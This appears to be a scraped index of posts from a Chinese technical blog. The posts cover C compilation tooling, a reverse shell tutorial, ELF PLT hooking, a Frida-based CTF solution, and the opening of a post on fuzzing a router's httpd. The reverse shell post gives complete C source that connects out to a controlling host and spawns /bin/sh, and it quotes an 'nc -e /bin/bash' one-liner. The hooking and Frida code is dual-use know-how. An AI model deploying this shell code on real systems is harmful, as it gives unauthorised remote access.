Rust 写一个计算器"},{"content":"C 和 C++ 的编译是真的痛苦，会出现一堆离谱的问题。所以我特地写一篇文章讲一下这些破事，并且提供一些样例代码方便复制黏贴。\n编译过程简述 在网上能找到一堆的编译流程相关的博客，而且肯定比我讲的正确，所以这里我就简单概括下。\n现在很少有程序能只依赖与 C 标准库和系统 API 了，所以会有一堆的外部依赖库。要想编译成功，得让编译器和链接器都知道去哪找这些库，怎么链接上。于是就有了一堆的编译管理工具。像 CMake 和 Meson 是负责生成编译的脚本，make 和 ninja 则是负责执行编译任务，然后是 gcc 和 clang 将代码编译成目标文件，最后有 ld, gold, mold 将目标文件进行链接生成可执行文件。\nCMake -\u0026gt; make -\u0026gt; gcc -\u0026gt; ld -\u0026gt; 可执行文件 Meson ninja clang gold Bazel ... zig cc lld ... ... mold ... 编译系统 Meson 样例代码\n# 指定项目名称，使用语言，默认选项 project('project name', 'cpp' default_options : ['c_std=c11', 'cpp_std=c++11']) # 指定头文件位置 incdir = include_directories('include') #（可选）使用 math 库 cc = meson.get_compiler('c') m_dep = cc.find_library('m') #（可选）使用 `dependency` 寻找库依赖 zdep = dependency('zlib', version: '\u0026gt;=1.2.8') #（可选）子目录 subdir('tests') # 指定代码文件位置，头文件位置来生成可执行文件 utils = ['src/logger.cpp', 'src/utils.cpp'] # 可执行文件的相关设置 executable('client', 'src/main_client.cpp', 'src/client.cpp', utils, include_directories : incdir, dependencies : m_dep cpp_args: [], c_args: [], link_args : '') # 在 executable 函数中添加下面的设置可以编译 32 位，静态链接的程序 # cpp_args: ['-m32', '-static'], # c_args: ['-m32', '-static'], # link_args : '-m32' 常用编译命令\n# 生成编译所需文件 meson setup builddir --wipe # Debug 编译 meson setup --buildtype debug --reconfigure # 编译 meson compile -C builddir 更多的内容参考 #refs\nCMake 样例代码\n# 指定项目名字，CMake 版本要求，C++ 版本要求 project(project_name) cmake_minimum_required(VERSION 3.0) set(CXX_STANDARD 11) # 使用 CMake 管理的库 find_package(OpenCV REQUIRED) include_directories(${OpenCV_INCLUDE_DIRS}) link_directories(${OpenCV_LIBRARY_DIRS}) # 使用由 pkg-config 管理的库 find_package(PkgConfig) pkg_search_module(LIBNOTIFY REQUIRED libnotify) include_directories(${LIBNOTIFY_INCLUDE_DIRS}) # 指定头文件目录 include_directories(./include) # 扫描目录，获得目录下源代码位置 aux_source_directory(./src SRC) add_executable(name ${SRC}) # 链接上库 target_link_libraries(${PROJECT_NAME} ${OpenCV_LIBS} ${LIBNOTIFY_LIBRARIES}) 常用命令\n# 编译 cd build \u0026amp;\u0026amp; cmake .. # Debug 编译 cmake -DCMAKE_BUILD_TYPE=Debug .. Makefile Makefile 的可读性真的是灾难级别的，下面这篇文章图文并茂，讲的很好，推荐阅读！！！\nMakefile由浅入深\u0026ndash;教程、干货\n库管理工具 pkg-config 选项 作用 样例 --cflags 查询这个库的所需要的 CFLAGS pkg-config --cflags glib-2.0 --libs 查询链接上这个库的所需要的选项 pkg-config --libs zlib –-list-all 列出所有的，可以被查找到的库 pkg-config –-list-all | rg $库 设置 pkg-config 搜索路径\nexport PKG_CONFIG_PATH=/usr/lib/pkgconfig/:$PKG_CONFIG_PATH 官方文档参考 #refs\n编译器 GCC编译选项 链接 选项 作用 样例 -l$library 链接上某个库 -lm -static 静态链接库 -static-libstdc++ 静态链接libstdc++ -Wl,$option 将链接选项传递给 ld 目录搜索 选项 作用 样例 -I $dir （大写的i）头文件搜索路径 -I ./include -L$dir 库文件搜索路径 -L./lib --sysroot=$dir 头文件和库的搜索路径 --sysroot=/usr 使用 zig cc 进行跨平台编译 zig cc 真是跨平台编译救星，下面演示下常见命令。\n# 显示支持的 libc zig targets | jq .libc # 直接编译 zig cc $文件 -target $目标 zig cc hello.c -target i386-linux-musl -static # 让 make 等工具使用 make CC=\u0026quot;zig cc\u0026quot; CXX=\u0026quot;zig c++\u0026quot; 参考文章 #refs\n环境配置 Docker/Podman Ubuntu image，添加 32 位支持，安装编译工具链，库和 CMake\nFROM ubuntu:18.04 RUN dpkg --add-architecture i386 \u0026amp;\u0026amp; \\ apt update \u0026amp;\u0026amp; \\ apt install -y gcc-multilib g++-multilib build-essential cmake CentOS image，从本地复制一份 ninja，安装编译工具，相关的库和 Meson\nFROM amd64/centos:7 COPY ./ninja /usr/local/bin RUN yum install python3 glibc-devel.i686 glibc-devel.x86_64 libgcc.i686 libgcc.x86_64 libstdc++-devel.i686 libstdc++-devel -y \u0026amp;\u0026amp; \\ yum group install \u0026quot;Development Tools\u0026quot; -y RUN python3 -m pip install meson -i https://opentuna.cn/pypi/web/simple 使用容器进行编译。设置成运行完后删除，并将当前目录映射到 \u0026ldquo;/src\u0026rdquo; 目录下，启动名字为 $容器名字 的容器。\npodman run --rm -v \u0026quot;$(pwd):/src\u0026quot; -it $容器名字 Glibc symver 有时候在新系统上编译的可执行文件，在旧系统上运行时，会产生 \u0026ldquo;找不到函数\u0026rdquo; 错误。这时候可以通过指定 symver 来进行兼容旧版本。具体细节可以参考 #Refs 中的 \u0026ldquo;All about symbol versioning\u0026rdquo;，或者使用 \u0026ldquo;wheybags/glibc_version_header\u0026rdquo; 这个项目。\n__asm__(\u0026quot;.symver fopen,fopen@GLIBC_2.2.5\u0026quot;); Refs https://gcc.gnu.org/onlinedocs/gcc-11.3.0/gcc/ https://www.freedesktop.org/wiki/Software/pkg-config https://mesonbuild.com/howtox.html https://mesonbuild.com/Meson-sample.html https://andrewkelley.me/post/zig-cc-powerful-drop-in-replacement-gcc-clang.html All about symbol versioning https://github.com/wheybags/glibc_version_header ","date":"2022-05-21","permalink":"https://chenx6.github.io/post/compile_cheatsheet/","tags":["cpp","c","compile"],"title":"关于 C 语言编译的那些破事"},{"content":"在网上能看到一堆的反弹 Shell 方法，最常见的就是先用 nc -e /bin/bash $控制机IP $控制机端口 弹出一个 Shell，然后再用 python3 -c 'import pty; pty.spawn(\u0026quot;/bin/bash\u0026quot;)' 这样来升级成交互式 Shell。这样的话得保证环境里有 nc + python，或者得在被控机上下载多个文件。这样的话，还不如直接自己写一个 Shell 呢 233。\n“可交互 Shell” 的原理 现在常见的“终端模拟器”，例如 KDE 的 Konsole, MACos 上的 iterm，服务器上的 SSH，都是使用 \u0026ldquo;pty\u0026rdquo; 来实现的。而我们反弹的 Shell 则不一样，所以无法交互。\n而 pty 则是模拟终端的设备。平时使用的终端模拟器是和 pty master 进行沟通，而里面的 shell 是和 pty slave 进行沟通，两者通过 pty 进行沟通。\n终端模拟器 \u0026lt;=\u0026gt; | pty master | pty | pty slave | \u0026lt;=\u0026gt; shell 所以我们的实现也很简单，通过 socket 将被控端的 master 和控制端连接起来就好了。\n终端模拟器 \u0026lt;=\u0026gt; 控制端 \u0026lt;=(socket 通信)=\u0026gt; 被控端 \u0026lt;=\u0026gt; | pty master | pty | pty slave | \u0026lt;=\u0026gt; shell 代码实现 首先是导入相关文件，\u0026ldquo;pty.h\u0026rdquo; 包含 pty 相关函数的定义，而 \u0026ldquo;select.h\u0026rdquo; 则是用来处理异步通信的。\n#include \u0026lt;pty.h\u0026gt; #include \u0026lt;sys/select.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026quot;util.h\u0026quot; 被控端代码很简单，通过传入的 host 和 port 创建 socket 连接，然后通过 forkpty 创建 pty，在父进程中进行 socket 和子进程中的通信。\n需要注意的是 forkpty 函数，在 FreeBSD 的 man 手册的说明如下\nThe forkpty() function combines openpty(), fork(2), and login_tty() to create a new process operating in a pseudoterminal. A file descriptor referring to master side of the pseudoterminal is returned in amaster. If name is not NULL, the buffer it points to is used to return the filename of the slave. The termp and winp arguments, if not NULL, will determine the terminal attributes and window size of the slave side of the pseudoterminal. 简单翻译就是创建一对 pty，并且 fork 出子进程，然后将 master fd 和 pty 连接起来，将子进程的输入和输出和 slave fd 连接起来。这样的话，父进程只要通过 master fd 就可以和处于 pty slave 处的子进程进行沟通。\nint main(int argc, char **argv, char **envp) { if (argc \u0026lt; 3) { printf(\u0026quot;Usage: %s [host] [port]\\n\u0026quot;, argv[0]); return -1; } int port = atoi(argv[2]); int socket_fd = 0, master_fd = 0; if ((socket_fd = get_socket_connect(argv[1], port)) \u0026lt;= 0) { return -2; } // Use forkpty to handle communication between pty master and socket int pid = forkpty(\u0026amp;master_fd, NULL, NULL, NULL); if (pid \u0026lt; 0) { return -3; } else if (pid != 0) { // Parent copy_loop(master_fd, socket_fd); } else { // Child execve(\u0026quot;/bin/sh\u0026quot;, NULL, NULL); exit(0); } return 0; } 下面的代码则是在两个 fd 之间互相复制内容。通过 select 函数判断哪个 fd 可读，然后将可读 fd 里的内容输出到另一个 fd 里。\nstatic int copy_loop(int fd1, int fd2) { plog(\u0026quot;%d, %d\u0026quot;, fd1, fd2); for (;;) { fd_set set; FD_ZERO(\u0026amp;set); FD_SET(fd1, \u0026amp;set); FD_SET(fd2, \u0026amp;set); if (select(max(fd1, fd2) + 1, \u0026amp;set, NULL, NULL, NULL) \u0026lt;= 0) { return -2; } int read_fd = 0, write_fd = 0; if (FD_ISSET(fd1, \u0026amp;set)) { read_fd = fd1; write_fd = fd2; } else if (FD_ISSET(fd2, \u0026amp;set)) { read_fd = fd2; write_fd = fd1; } int read_bytes = copy_data(read_fd, write_fd); if (read_bytes \u0026lt; 0) { return read_bytes; } } } 而控制端的代码看起来会比较奇怪。首先是打开了 /proc/self/fd/0，可以看到这是指向了 /dev/pts/1，即打开当前的 pty。\n~/d/chenx6.github.io \u0026gt; ls -la /proc/self/fd 总用量 0 dr-x------ 2 chenx chenx 0 5月 2 19:47 . dr-xr-xr-x 9 chenx chenx 0 5月 2 19:47 .. lrwx------ 1 chenx chenx 64 5月 2 19:47 0 -\u0026gt; /dev/pts/1 lrwx------ 1 chenx chenx 64 5月 2 19:47 1 -\u0026gt; /dev/pts/1 lrwx------ 1 chenx chenx 64 5月 2 19:47 2 -\u0026gt; /dev/pts/1 lr-x------ 1 chenx chenx 64 5月 2 19:47 3 -\u0026gt; /proc/1091/fd lr-x------ 1 chenx chenx 64 5月 2 19:47 51 -\u0026gt; anon_inode:inotify 然后是终端的设置。对 c_lflag 本地模式进行设置，设置为不回显，uncanonical mode。然后是对 c_cc 特殊字符设置不处理 ”^C / ^Z / ^\\“。\n最后就是创建 socket 连接，复制数据(和被控端类似，区别请见末尾的文件)。当复制结束时则恢复回原本的终端设置。\n#include \u0026lt;arpa/inet.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;pty.h\u0026gt; #include \u0026lt;sys/select.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;termios.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026quot;util.h\u0026quot; int main() { // PTY int pty_fd = open(\u0026quot;/proc/self/fd/0\u0026quot;, O_RDWR); struct termios terminal, origin_terminal; tcgetattr(pty_fd, \u0026amp;terminal); origin_terminal = terminal; // turn off echo, uncanonical mode terminal.c_lflag \u0026amp;= ~ECHO; terminal.c_lflag \u0026amp;= ~ICANON; // Don't handle ^C / ^Z / ^\\ terminal.c_cc[VINTR] = 0; terminal.c_cc[VQUIT] = 0; terminal.c_cc[VSUSP] = 0; tcsetattr(pty_fd, TCSANOW, \u0026amp;terminal); // Socket int listen_fd = get_socket_listen(\u0026quot;0.0.0.0\u0026quot;, 8888); socklen_t s; struct sockaddr accepted_addr; int accepted_fd = accept(listen_fd, \u0026amp;accepted_addr, \u0026amp;s); copy_loop(accepted_fd); tcsetattr(pty_fd, TCSANOW, \u0026amp;origin_terminal); return 0; } 可以看到，很少的代码就能创建一个交互式反弹 Shell，还能复习 UNIX 知识。\n完整代码在这：https://gist.github.com/chenx6/7a51c3cda5c0055a4df5cee66f762fea\nRefs 基于原本的项目，魔改了下，兼容 Python3 https://github.com/chenx6/python-pty-shells pseudo-terminal 基础一 linux select函数解析以及事例 ","date":"2022-05-02","permalink":"https://chenx6.github.io/post/rev_pty/","tags":["linux"],"title":"写一个可交互的反弹 Shell"},{"content":"虽然知道可以通过魔改 plt 表实现 hook 函数，但是不知道具体实现\u0026hellip;碰巧最近用到了 plthook 这个库，于是我就研究了下 plthook 这个库，并且仿照着这个库重新实现一份代码。\n原理分析 根据命名规则，.rela.plt 表是负责 plt 表的重定位信息。.rela 表中有每项都有 2 个成员，r_offset 指向了该重定位入口所要修正的位置的第一个字节的虚拟地址， r_info 则是表示相关信息，可以通过 ELF[32|64]_R_SYM 获得其指向的 .dynsym 项的下标。\n.dynsym 表（动态链接表）中存放动态链接需要的信息，可以通过 .dynsym 表从 .strtab 表中获得要链接的函数名字。\n项目代码分析 经过阅读代码后，我大致了解了 plthook 在 Linux/x86_64 平台上的逻辑。\n由于项目的代码支持多个 UNIX 系统（Windows 下则是实现了 IAT Hook），所以原项目中有一堆的宏和封装，下面的逻辑只对应着 Linux/x86_64 平台。\n获取 link_map 对动态库使用 dlinfo(hndl, RTLD_DI_LINKMAP, \u0026amp;lmap) 对可执行文件使用 _r_debug.r_map 结构体 通过 link_map 获取相关 section 的信息。 获取 \u0026ldquo;DT_SYMTAB DT_STRTAB DT_STRSZ DT_JMPREL DT_PLTRELSZ\u0026rdquo; 的相关信息 在 rela 表中获得其在 dynsym 中的位置，然后通过 dynsym 获得名字 如果是被替换函数，就通过修改 PLT 表进行替换。 重新复现 首先是通过 dlopen dlinfo 获得 link_map。使用 sysconf 则是获得了页的大小。\n/// @brief Initlize plthook_info /// @param info empty plthook_info variable /// @param name library name, NULL means program itself plthook_status plt_hook_init(plthook_info *info, char *name) { page_size = sysconf(_SC_PAGESIZE); plthook_status status = PLTHOOK_SUCCESS; // Get link_map void *handle = dlopen(name, RTLD_LAZY | RTLD_NOLOAD); struct link_map *map = NULL; int result = dlinfo(handle, RTLD_DI_LINKMAP, \u0026amp;map); 然后是从 link_map 中获得各个 section（\u0026ldquo;DT_SYMTAB DT_STRTAB DT_STRSZ DT_JMPREL DT_PLTRELSZ\u0026rdquo;）的信息，供后续使用。\n// Get information from link_map's address and dyn table info-\u0026gt;base_addr = (uint8_t *)map-\u0026gt;l_addr; size_t rela_size = 0; for (Elf64_Dyn *curr = map-\u0026gt;l_ld; curr-\u0026gt;d_tag != DT_NULL; curr++) { switch (curr-\u0026gt;d_tag) { // Address of string table case DT_STRTAB: info-\u0026gt;str_table = curr-\u0026gt;d_un.d_ptr; break; case DT_STRSZ: info-\u0026gt;str_sz = curr-\u0026gt;d_un.d_val; break; // Address of relocation entries associated solely with the PLT case DT_JMPREL: info-\u0026gt;rel = (Elf64_Rela *)curr-\u0026gt;d_un.d_ptr; break; case DT_PLTRELSZ: rela_size = curr-\u0026gt;d_un.d_val; break; // Address of symbol table case DT_SYMTAB: info-\u0026gt;dynsym = (Elf64_Sym *)curr-\u0026gt;d_un.d_ptr; break; } } info-\u0026gt;rel_cnt = rela_size / sizeof(Elf64_Rela); return status; } 然后是替换函数。主要流程就是通过 .rela.plt 表找到函数在 .dynsym 段的位置，然后再通过 .dynsym 段获取函数名字，如果是要替换的函数的话，就用 mprotect 将段加上可写权限，并通过写入 r_offset 指向的地址进行魔改。\n/// @brief Replace function with new function plthook_status plt_hook_replace(plthook_info *info, char *name, void *func_address) { if (info == NULL || name == NULL || func_address == NULL) { return PLTHOOK_ARGUMENT_ERROR; } // Get symbol index from relocation table, then get function name from symbol Elf64_Rela *rela = info-\u0026gt;rel; for (size_t i = 0; i \u0026lt; info-\u0026gt;rel_cnt; i++) { Elf64_Rela *curr = rela + i; size_t sym_idx = ELF64_R_SYM(curr-\u0026gt;r_info); size_t str_idx = info-\u0026gt;dynsym[sym_idx].st_name; if (strcmp(name, info-\u0026gt;str_table + str_idx) != 0) { continue; } size_t *origin_func = (size_t *)(info-\u0026gt;base_addr + curr-\u0026gt;r_offset); mprotect(ALIGN_ADDR(origin_func), page_size, PROT_READ | PROT_WRITE | PROT_EXEC); *origin_func = (size_t)func_address; return PLTHOOK_SUCCESS; } return PLTHOOK_NOT_FOUND; } 完整代码：https://gist.github.com/chenx6/2624aae29873ffabbeb74b75d2351f22\n将代码和 test_main.c 一起编译(别忘了加上 -ldl)后，应该可以看到 atoi 的返回值从正确的 \u0026ldquo;123456\u0026rdquo; 变成了 \u0026ldquo;114514\u0026rdquo;，说明这个 POC 实现成功了。也可以通过用 ((constructor)) 修饰函数，通过 so 注入进行修改。\nRefs kubo/plthook man elf ELF加载器的原理与实现 计算机那些事(4)——ELF文件结构 ","date":"2022-04-05","permalink":"https://chenx6.github.io/post/plthook/","tags":["re","plt","elf"],"title":"plt hook 项目代码分析和最小实现"},{"content":"在某次离谱比赛中，我使用了 Frida 解出了题目，下面是一些简单的笔记。\n在 2021 年 10 月 24 日，我浪费了2小时的时间解出了一个某弹幕网站办的比赛的离谱安卓题，解出之后的内心就是：rnm，退时间！更加嘲讽的是，他还在一个月后转给了我 0.56 元作为奖励！\n那天比较欣慰的是在某弹幕网站上看完了 A·ZU·NA 的 FMT（\n第一关 首先找到程序入口点，可以直接看到程序的逻辑，就是将用户输入的帐号和密码用 Encrypt.a 和 Encrypt.b 进行加密，然后对比内容。那接下来就直接照抄一遍加密函数中的代码进行反向解密。\npublic class MainActivity extends AppCompatActivity { // ... public void onClick(View view) { String obj = ((EditText) MainActivity.this.findViewById(R.id.TextAccount)).getText().toString(); String obj2 = ((EditText) MainActivity.this.findViewById(R.id.TextPassword)).getText().toString(); byte[] b = Encrypt.b(Encrypt.a(obj.getBytes(), 3)); byte[] b2 = Encrypt.b(Encrypt.a(obj2.getBytes(), 3)); byte[] bArr = {89, 87, 66, 108, 79, 109, 90, 110, 78, 106, 65, 117, 79, 109, 74, 109, 78, 122, 65, 120, 79, 50, 89, 61}; if (!Arrays.equals(b, new byte[]{78, 106, 73, 49, 79, 122, 65, 51, 89, 71, 65, 117, 78, 106, 78, 109, 78, 122, 99, 55, 89, 109, 85, 61}) || !Arrays.equals(b2, bArr)) { Toast.makeText(MainActivity.this, \u0026quot;还差一点点~~~\u0026quot;, 1).show(); } else { Toast.makeText(MainActivity.this, \u0026quot;bilibili- ( ゜- ゜)つロ 乾杯~\u0026quot;, 1).show(); } } // ... } 下面是解密脚本。\nfrom base64 import b64decode enc_username = [ 78, 106, 73, 49, 79, 122, 65, 51, 89, 71, 65, 117, 78, 106, 78, 109, 78, 122, 99, 55, 89, 109, 85, 61, ] enc_password = [ 89, 87, 66, 108, 79, 109, 90, 110, 78, 106, 65, 117, 79, 109, 74, 109, 78, 122, 65, 120, 79, 50, 89, 61, ] def dec(enc: list[int]): dec1 = \u0026quot;\u0026quot;.join(map(chr, enc)) dec2 = b64decode(dec1) dec3 = \u0026quot;\u0026quot;.join(map(lambda x: chr(x ^ 3), dec2)) return dec3 print(dec(enc_username)) print(dec(enc_password)) 第二关 没想到吧，还有第二关。只剩下 libMylib.so 没分析过了。根据 Java 层的代码，第二关应该在 Mylib 的 i 函数中。\npublic native String i(); static { System.loadLibrary(\u0026quot;Mylib\u0026quot;); } 函数的开头就是调用了 __system_property_get 函数进行对比结果。\n__system_property_get(\u0026quot;ro.product.cpu.abi\u0026quot;, res1); __system_property_get(\u0026quot;ro.build.version.release\u0026quot;, res2); if ( *(_DWORD *)res1 == 0x363878 \u0026amp;\u0026amp; *(unsigned __int16 *)res2 == 0x39 ) { // ... } 在网上进行查询后，我使用 Memory.readCString 读取函数的参数，然后根据参数，使用 Memory.writeByteArray 写入不同的结果。\n// hook system_property_get let funcAddr = Module.findExportByName(\u0026quot;libc.so\u0026quot;, \u0026quot;__system_property_get\u0026quot;); console.log(\u0026quot;[*] spg addr is %x\u0026quot;, funcAddr); Interceptor.attach(funcAddr, { arg0: \u0026quot;\u0026quot;, arg1: 0, onEnter: function (args) { let arg0 = Memory.readCString(args[0]); console.log(\u0026quot;[*] arg0\u0026quot;, arg0); if (arg0 === \u0026quot;ro.product.cpu.abi\u0026quot;) { this.arg0 = arg0; this.arg1 = args[1]; } else if (arg0 === \u0026quot;ro.build.version.release\u0026quot;) { this.arg0 = arg0; this.arg1 = args[1]; } }, onLeave: function (retval) { if (this.arg0 === \u0026quot;ro.product.cpu.abi\u0026quot;) { Memory.writeByteArray(this.arg1, [0x78, 0x38, 0x36, 0x0]); } else if (this.arg0 === \u0026quot;ro.build.version.release\u0026quot;) { Memory.writeByteArray(this.arg1, [0x39, 0x0, 0x0, 0x0]); } console.log(\u0026quot;[*] ret\u0026quot;, retval); } }); 接下来的代码就非常的直接了，就是检查 /data/2233 文件是否存在，如果存在就解密内容，写入到文件中。\nv1 = fopen(\u0026quot;/data/2233\u0026quot;, \u0026quot;r\u0026quot;); if ( v1 ) { fclose(v1); strcpy((char *)encrypt, \u0026quot;bili_2233_3322\u0026quot;); strcpy((char *)encrypt2, \u0026quot;bili_3322_2233\u0026quot;); *(_OWORD *)context.count = xmmword_1F60; *(_QWORD *)\u0026amp;context.state[2] = 0x1032547698BADCFELL; v2 = __strlen_chk((const char *)encrypt, 0xFuLL); EU(\u0026amp;context, encrypt, v2); *(_DWORD *)res3 = context.count[0]; v24 = context.count[1]; v3 = (context.count[0] \u0026gt;\u0026gt; 3) \u0026amp; 0x3F; if ( v3 \u0026gt;= 0x38 ) v4 = 120; else v4 = 56; EU(\u0026amp;context, PADDING, v4 - v3); EU(\u0026amp;context, res3, 8u); *(_DWORD *)decrypt = context.state[0]; *(_OWORD *)v15.count = xmmword_1F60; *(_QWORD *)\u0026amp;decrypt[4] = *(_QWORD *)\u0026amp;context.state[1]; *(_DWORD *)\u0026amp;decrypt[12] = context.state[3]; *(_QWORD *)\u0026amp;v15.state[2] = 0x1032547698BADCFELL; v5 = __strlen_chk((const char *)encrypt2, 0xFuLL); EU(\u0026amp;v15, encrypt2, v5); v6 = (v15.count[0] \u0026gt;\u0026gt; 3) \u0026amp; 0x3F; *(_DWORD *)res3 = v15.count[0]; v24 = v15.count[1]; if ( v6 \u0026gt;= 0x38 ) v7 = 120; else v7 = 56; EU(\u0026amp;v15, PADDING, v7 - v6); EU(\u0026amp;v15, res3, 8u); *(_DWORD *)decrypt2 = v15.state[0]; *(_QWORD *)\u0026amp;decrypt2[4] = *(_QWORD *)\u0026amp;v15.state[1]; *(_DWORD *)\u0026amp;decrypt2[12] = v15.state[3]; v10 = fopen(\u0026quot;/data/2233\u0026quot;, \u0026quot;a+\u0026quot;); if ( v10 ) { for ( i = 0LL; i != 8; ++i ) { ZL7sprintfPcU17pass_object_size1PKcz(res3, v8, v9, decrypt[i]); ZL7sprintfPcU17pass_object_size1PKcz(dest, v12, v13, decrypt2[i]); fputs((const char *)res3, v10); fputs((const char *)dest, v10); } fwrite(\u0026quot;-----------\\n\u0026quot;, 0xCuLL, 1uLL, v10); } fclose(v10); } 很显然，作为一个普通的程序是不能直接写入 /data 文件夹的，所以得通过 hook 让他写到别的地方去。代码非常简单粗暴，将 fopen 的第一个参数 \u0026ldquo;/data/2233\u0026rdquo; 换成 \u0026lsquo;/data/local/tmp/2233\u0026rsquo;，然后返回一个错误的 fd 给他，让代码继续执行。\n// hook fopen funcAddr = Module.findExportByName(\u0026quot;libc.so\u0026quot;, \u0026quot;fopen\u0026quot;); console.log(\u0026quot;[*] fopen addr\u0026quot;, funcAddr) Interceptor.attach(funcAddr, { arg0: \u0026quot;\u0026quot;, onEnter: function (args) { let arg0 = Memory.readCString(args[0]); console.log(\u0026quot;[*] arg0\u0026quot;, arg0); if (arg0 === \u0026quot;/data/2233\u0026quot;) { Memory.protect(args[0], 16, 'rwx'); args[0].writeUtf8String('/data/local/tmp/2233'); console.log(\u0026quot;[+] replaced by\u0026quot;, Memory.readCString(args[0])); } else if (arg0 === \u0026quot;/data/local/tmp/2233\u0026quot;) { this.arg0 = arg0; } }, onLeave: function (retval) { if (this.arg0 === \u0026quot;/data/local/tmp/2233\u0026quot;) { retval.replace(123); } console.log(\u0026quot;[*] ret\u0026quot;, retval); } }); 在上面这么 hook 之后，后面的 fputs 必定会错误，所以我们直接使用 Frida 将 fputs 替换成自己实现的函数，直接输出 fputs 的内容。\n// replace fputs funcAddr = Module.findExportByName(\u0026quot;libc.so\u0026quot;, \u0026quot;fputs\u0026quot;); const fopen = new NativeFunction(funcAddr, 'int', ['pointer', 'pointer']); Interceptor.replace(funcAddr, new NativeCallback((strPtr, filePtr) =\u0026gt; { let str = Memory.readCString(strPtr); console.log('[*] fputs', str); return str.length; }, 'int', ['pointer', 'pointer'])); 最直观的方法让上一步返回一个真实文件的 FD，但是没有找到相关的代码，所以只能折中采用这种方式进行 Hook。\n由于程序中没有任何一个地方调用 i 函数，所以调用一下进行解密。\nJava.perform(() =\u0026gt; { Java.choose(\u0026quot;com.example.test.MainActivity\u0026quot;, { onMatch: function (instance) { console.log(\u0026quot;[+] onMatch\u0026quot;); let ret = instance.i(); console.log(\u0026quot;[*] ret=\u0026quot;, ret); }, onComplete: function () { console.log(\u0026quot;[+] onComplete\u0026quot;); } }); }); 最终代码 /**b13981f45ae996d4bc04be5b34662a78*/ // hook system_property_get let funcAddr = Module.findExportByName(\u0026quot;libc.so\u0026quot;, \u0026quot;__system_property_get\u0026quot;); console.log(\u0026quot;[*] spg addr is %x\u0026quot;, funcAddr); Interceptor.attach(funcAddr, { arg0: \u0026quot;\u0026quot;, arg1: 0, onEnter: function (args) { let arg0 = Memory.readCString(args[0]); console.log(\u0026quot;[*] arg0\u0026quot;, arg0); if (arg0 === \u0026quot;ro.product.cpu.abi\u0026quot;) { this.arg0 = arg0; this.arg1 = args[1]; } else if (arg0 === \u0026quot;ro.build.version.release\u0026quot;) { this.arg0 = arg0; this.arg1 = args[1]; } }, onLeave: function (retval) { if (this.arg0 === \u0026quot;ro.product.cpu.abi\u0026quot;) { Memory.writeByteArray(this.arg1, [0x78, 0x38, 0x36, 0x0]); } else if (this.arg0 === \u0026quot;ro.build.version.release\u0026quot;) { Memory.writeByteArray(this.arg1, [0x39, 0x0, 0x0, 0x0]); } console.log(\u0026quot;[*] ret\u0026quot;, retval); } }); // hook fopen funcAddr = Module.findExportByName(\u0026quot;libc.so\u0026quot;, \u0026quot;fopen\u0026quot;); console.log(\u0026quot;[*] fopen addr\u0026quot;, funcAddr) Interceptor.attach(funcAddr, { arg0: \u0026quot;\u0026quot;, onEnter: function (args) { let arg0 = Memory.readCString(args[0]); console.log(\u0026quot;[*] arg0\u0026quot;, arg0); if (arg0 === \u0026quot;/data/2233\u0026quot;) { Memory.protect(args[0], 16, 'rwx'); args[0].writeUtf8String('/data/local/tmp/2233'); console.log(\u0026quot;[+] replaced by\u0026quot;, Memory.readCString(args[0])); } else if (arg0 === \u0026quot;/data/local/tmp/2233\u0026quot;) { this.arg0 = arg0; } }, onLeave: function (retval) { if (this.arg0 === \u0026quot;/data/local/tmp/2233\u0026quot;) { retval.replace(123); } console.log(\u0026quot;[*] ret\u0026quot;, retval); } }); // replace fputs funcAddr = Module.findExportByName(\u0026quot;libc.so\u0026quot;, \u0026quot;fputs\u0026quot;); const fopen = new NativeFunction(funcAddr, 'int', ['pointer', 'pointer']); Interceptor.replace(funcAddr, new NativeCallback((strPtr, filePtr) =\u0026gt; { let str = Memory.readCString(strPtr); console.log('[*] fputs', str); return str.length; }, 'int', ['pointer', 'pointer'])); // Invoke i Java.perform(() =\u0026gt; { Java.choose(\u0026quot;com.example.test.MainActivity\u0026quot;, { onMatch: function (instance) { console.log(\u0026quot;[+] onMatch\u0026quot;); let ret = instance.i(); console.log(\u0026quot;[*] ret=\u0026quot;, ret); }, onComplete: function () { console.log(\u0026quot;[+] onComplete\u0026quot;); } }); }); 后记 得到解密的结果后还得加上 \u0026lsquo;-\u0026rsquo; 作为分隔符，才能正确提交，然而题目中也没有提示\u0026hellip;\nRefs javascript-api 使用 Frida Hook 不同类型的函数（失效文章） ","date":"2022-02-26","permalink":"https://chenx6.github.io/post/frida_beginner/","tags":["frida"],"title":"Frida 在一次离谱比赛中的应用"},{"content":"这是我第一次对华硕路由器的 httpd 进行 fuzz。结果 fuzz 出来的结果没有经过实机测试，就提交上去了，然后就是华硕的安全团队复现不出来\u0026hellip;为什么复现不出来，在本文总结处进行分析。本文主要讲我在进行固件 fuzz 时的具体过程。\n代码分析/逆向工程 华硕路由器的大部分源代码是公开的，可以在官网上下载到，并且有个开源的 RMerl/asuswrt-merlin.ng。阅读源代码发现， httpd 的源代码中间调用了些博通的库，没法直接用编译器进行插桩。所以就当作源码不存在，直接下载二进制文件进行无文件 fuzz 了\u0026hellip;\n2021 年 1 月 15 日，官网上突然载不到源代码了，所以请照着 RMerl/asuswrt-merlin.ng 项目进行代码审计。\n这里选择的路由器是 rt-ac68u，使用了 ARM 架构的 SOC。\n虽然引用了 OpenWRT 的链接，但是使用博通 SOC 的设备都不能刷 OpenWRT，因为(傻逼)博通对开源不友好\n下载下来的 trx 文件可以直接用 binwalk 进行分析。看来用 binwalk -Me 直接就能解压出固件了。\n~/Downloads \u0026gt; binwalk RT-AC68U_3.0.0.4_386_40558-gc48f410.trx DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 TRX firmware header, little endian, image size: 42590208 bytes, CRC32: 0xD26A9F05, flags: 0x0, version: 1, header size: 28 bytes, loader offset: 0x1C, linux kernel offset: 0x19B7C8, rootfs offset: 0x0 28 0x1C LZMA compressed data, properties: 0x5D, dictionary size: 65536 bytes, uncompressed size: 4034880 bytes 1685448 0x19B7C8 Squashfs filesystem, little endian, version 4.0, compression:xz, size: 40902633 bytes, 2832 inodes, blocksize: 131072 bytes, created: 2020-10-20 04:30:45 解压完后在 squashfs-root/usr/sbin 